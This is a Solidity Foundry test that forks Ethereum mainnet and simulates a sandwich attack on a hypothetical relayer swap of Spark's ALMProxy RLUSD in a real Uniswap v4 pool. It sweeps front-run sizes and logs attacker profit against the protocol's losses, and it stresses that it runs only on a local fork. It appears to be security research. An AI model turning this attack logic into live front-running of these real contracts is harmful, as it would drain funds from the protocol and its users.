// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

// PASSO 357: Read-only fork of Ethereum mainnet at fixed block 26_495_859.
// Tests a hypothetically authorized relayer swap of the ALMProxy's REAL RLUSD.
// Only ATTACKER gets synthetic capital. NEVER broadcasts to mainnet.
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {PoolKey} from "../../lib/uniswap-v4-core/src/types/PoolKey.sol";
import {Currency} from "../../lib/uniswap-v4-core/src/types/Currency.sol";
import {IV4Router} from "../../lib/uniswap-v4-periphery/src/interfaces/IV4Router.sol";
import {Actions} from "../../lib/uniswap-v4-periphery/src/libraries/Actions.sol";

interface IFSPositionManager {
    function poolKeys(bytes25 id) external view returns (PoolKey memory);
}
interface IFSMainnetController {
    function swapUniswapV4(bytes32 poolId, address tokenIn, uint128 amountIn, uint128 amountOutMin) external;
    function maxSlippages(address pool) external view returns (uint256);
}
interface IFSLimits {
    function getCurrentRateLimit(bytes32 key) external view returns (uint256);
}
interface IFSPermit2 {
    function approve(address token, address spender, uint160 amount, uint48 expiration) external;
}
interface IFSRouter {
    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external;
}
interface IFSToken {
    function balanceOf(address account) external view returns (uint256);
}

contract SparkFundedSwapSandwich is Test {
    address constant CONTROLLER = 0xc953972Cd006d1f12686fd7185c6D443b15900Cd;
    address constant PROXY = 0x1601843c5E9bC251A3272907010AFa41Fa18347E;
    address constant RELAYER = 0x8a25A24EDE9482C4Fc0738F99611BE58F1c839AB;
    address constant LIMITS = 0x7A5FD5cf045e010e62147F065cEAe59e5344b188;
    address constant RLUSD = 0x8292Bb45bf1Ee4d140127049757C2E0fF06317eD;
    address constant USDS = 0xdC035D45d973E3EC169d2276DDab16f1e407384F;
    address constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    address constant ROUTER = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af;
    address constant POSITION_MANAGER = 0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e;
    address constant ATTACKER = address(0x357357);
    bytes32 constant POOL = 0x9035721b23481db3888fd201b9c2b26dbc3af60258bca65e669f2ed98dc8eb4f;

    PoolKey internal key;

    // Override to return 0 in a derived test that needs live RPC state.
    // The original sandwich regression remains pinned to block 26_495_859.
    function _forkBlockNumber() internal pure virtual returns (uint256) {
        return 26_495_859;
    }

    function setUp() public {
        uint256 fixedBlock = _forkBlockNumber();
        if (fixedBlock == 0) {
            vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
        } else {
            vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), fixedBlock);
        }
        key = IFSPositionManager(POSITION_MANAGER).poolKeys(bytes25(POOL));
        assertEq(keccak256(abi.encode(key)), POOL, "Pool key mismatch");
        assertEq(Currency.unwrap(key.currency0), RLUSD, "Pool token0 mismatch");
        assertEq(Currency.unwrap(key.currency1), USDS, "Pool token1 mismatch");
        assertGe(_balance(RLUSD, PROXY), 5_000_000e18, "Spark has insufficient REAL RLUSD");

        // Sanity check the actual configured global slippage floor.
        assertEq(
            IFSMainnetController(CONTROLLER).maxSlippages(address(uint160(uint256(POOL)))),
            999e15, "Unexpected maxSlippage"
        );
        bytes32 keyLimit = keccak256(abi.encode(keccak256("LIMIT_UNISWAP_V4_SWAP"), POOL));
        assertGe(IFSLimits(LIMITS).getCurrentRateLimit(keyLimit), 5_000_000e18, "Rate limit under 5m");

        // Only the external attacker is given synthetic capital, never the Spark ALMProxy.
        deal(RLUSD, ATTACKER, 10_000_000e18, false);
        deal(USDS, ATTACKER, 10_000_000e18, false);
        vm.startPrank(ATTACKER);
        _approve(RLUSD, PERMIT2);
        _approve(USDS, PERMIT2);
        IFSPermit2(PERMIT2).approve(RLUSD, ROUTER, type(uint160).max, uint48(block.timestamp + 1 days));
        IFSPermit2(PERMIT2).approve(USDS, ROUTER, type(uint160).max, uint48(block.timestamp + 1 days));
        vm.stopPrank();
    }

    function _balance(address token, address owner) internal view returns (uint256) {
        return IFSToken(token).balanceOf(owner);
    }

    function _approve(address token, address spender) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSignature("approve(address,uint256)", spender, type(uint256).max)
        );
        require(ok && (data.length == 0 || (data.length == 32 && abi.decode(data,(bool)))), "Approval failed");
    }

    function _swapPublic(address tokenIn, uint128 amountIn) internal returns (uint256 outAmount) {
        address tokenOut = tokenIn == RLUSD ? USDS : RLUSD;
        bytes memory actions = abi.encodePacked(
            uint8(Actions.SWAP_EXACT_IN_SINGLE), uint8(Actions.SETTLE_ALL), uint8(Actions.TAKE_ALL)
        );
        bytes[] memory params = new bytes[](3);
        params[0] = abi.encode(IV4Router.ExactInputSingleParams({
            poolKey: key,
            zeroForOne: tokenIn == RLUSD,
            amountIn: amountIn,
            amountOutMinimum: 0,
            hookData: bytes("")
        }));
        params[1] = abi.encode(tokenIn, amountIn);
        params[2] = abi.encode(tokenOut, 0);
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(actions, params);

        uint256 beforeOut = _balance(tokenOut, ATTACKER);
        vm.prank(ATTACKER);
        IFSRouter(ROUTER).execute(abi.encodePacked(uint8(0x10)), inputs, block.timestamp);
        outAmount = _balance(tokenOut, ATTACKER) - beforeOut;
    }

    function _victimSwap(uint128 amountIn) internal returns (uint256 output) {
        uint256 beforeOut = _balance(USDS, PROXY);
        vm.prank(RELAYER);
        IFSMainnetController(CONTROLLER).swapUniswapV4(
            POOL, RLUSD, amountIn, uint128(uint256(amountIn) * 999 / 1000)
        );
        output = _balance(USDS, PROXY) - beforeOut;
    }

    function baseline(uint128 victimAmount) external returns (uint256 output) {
        require(msg.sender == address(this), "self only");
        return _victimSwap(victimAmount);
    }

    function scenario(uint128 victimAmount, uint128 frontAmount, bool frontWithRLUSD, bool withVictim)
        external returns (int256 pnlMicro, uint256 victimOut, uint256 attackerSwapGas)
    {
        require(msg.sender == address(this), "self only");
        uint256 attackerBeforeRLUSD = _balance(RLUSD, ATTACKER);
        uint256 attackerBeforeUSDS = _balance(USDS, ATTACKER);

        address frontToken = frontWithRLUSD ? RLUSD : USDS;
        address reverseToken = frontWithRLUSD ? USDS : RLUSD;

        uint256 firstGas = gasleft();
        uint256 frontReceived = _swapPublic(frontToken, frontAmount);
        attackerSwapGas = firstGas - gasleft();

        if (withVictim) victimOut = _victimSwap(victimAmount);

        require(frontReceived <= type(uint128).max, "Reverse overflow");

        uint256 secondGas = gasleft();
        _swapPublic(reverseToken, uint128(frontReceived));
        attackerSwapGas += secondGas - gasleft();

        int256 pnl18 = (
            int256(_balance(RLUSD, ATTACKER)) - int256(attackerBeforeRLUSD)
        ) + (
            int256(_balance(USDS, ATTACKER)) - int256(attackerBeforeUSDS)
        );
        pnlMicro = pnl18 / 1e12;
    }

    function testRealSparkRLUSDSandwich() public {
        console2.log("=== PASSO 357: REAL SPARK RLUSD, REAL V4 POOL ===");
        console2.log("Pinned Ethereum block", block.number);
        console2.log("REAL Spark RLUSD balance before test (18 decimals)", _balance(RLUSD, PROXY));
        console2.log("Synthetic funds ONLY on attacker, not on Spark ALMProxy");

        uint256[2] memory victimSizes = [uint256(1_000_000), 5_000_000];
        uint256[5] memory frontSizes = [uint256(10_000), 50_000, 200_000, 1_000_000, 3_000_000];
        uint256 completed;
        uint256 profitable;
        uint256 reverted;

        for (uint256 i; i < victimSizes.length; ++i) {
            uint128 victim = uint128(victimSizes[i] * 1e18);
            uint256 preBaseline = vm.snapshotState();
            uint256 baselineOut;

            try this.baseline(victim) returns (uint256 value) {
                baselineOut = value;
            } catch Error(string memory reason) {
                console2.log("BASELINE UNEXECUTABLE:", reason);
                vm.revertToState(preBaseline);
                continue;
            } catch {
                console2.log("BASELINE UNEXECUTABLE (opaque)");
                vm.revertToState(preBaseline);
                continue;
            }
            vm.revertToState(preBaseline);
            console2.log("--- Victim REAL RLUSD size", victimSizes[i]);
            console2.log("Baseline Spark USDS received (microUSD)", baselineOut / 1e12);

            for (uint256 d; d < 2; ++d) {
                bool frontWithRLUSD = d == 0;
                for (uint256 j; j < frontSizes.length; ++j) {
                    uint128 front = uint128(frontSizes[j] * 1e18);
                    uint256 snap = vm.snapshotState();
                    int256 control;
                    bool controlOK;
                    try this.scenario(victim, front, frontWithRLUSD, false)
                        returns (int256 pnl, uint256, uint256)
                    {
                        control = pnl;
                        controlOK = true;
                    } catch {
                        console2.log("CONTROL REVERT: front size", frontSizes[j]);
                    }
                    vm.revertToState(snap);

                    snap = vm.snapshotState();
                    try this.scenario(victim, front, frontWithRLUSD, true)
                        returns (int256 pnl, uint256 received, uint256 gasUsed)
                    {
                        completed++;
                        int256 extraLoss = int256(baselineOut) - int256(received);
                        console2.log("Victim size", victimSizes[i]);
                        console2.log("Front size", frontSizes[j]);
                        console2.log("Front uses RLUSD", frontWithRLUSD);
                        console2.log("Control profitable (without victim)", controlOK && control > 0);
                        console2.log("Control PnL microUSD", control);
                        console2.log("Attacker gross PnL microUSD", pnl);
                        console2.log("Spark incremental loss microUSD", extraLoss / 1e12);
                        console2.log("Attacker swap gas estimate", gasUsed);
                        if (controlOK && pnl > 0 && extraLoss > 0) {
                            profitable++;
                            console2.log("GROSS CANDIDATE: needs real transaction and net gas verification");
                        }
                    } catch Error(string memory reason) {
                        reverted++;
                        console2.log("SCENARIO REVERT:", reason);
                    } catch {
                        reverted++;
                        console2.log("SCENARIO REVERT (opaque)");
                    }
                    vm.revertToState(snap);
                }
            }
        }
        console2.log("Completed scenarios", completed);
        console2.log("Profitable gross candidates", profitable);
        console2.log("Reverted attack scenarios", reverted);
        console2.log("AUTHORIZED VICTIM OPERATION IS HYPOTHETICAL, NOT OBSERVED IN MEMPOOL.");
        console2.log("LOCAL FORK ONLY. NO LIVE TRANSACTIONS.");
    }
}
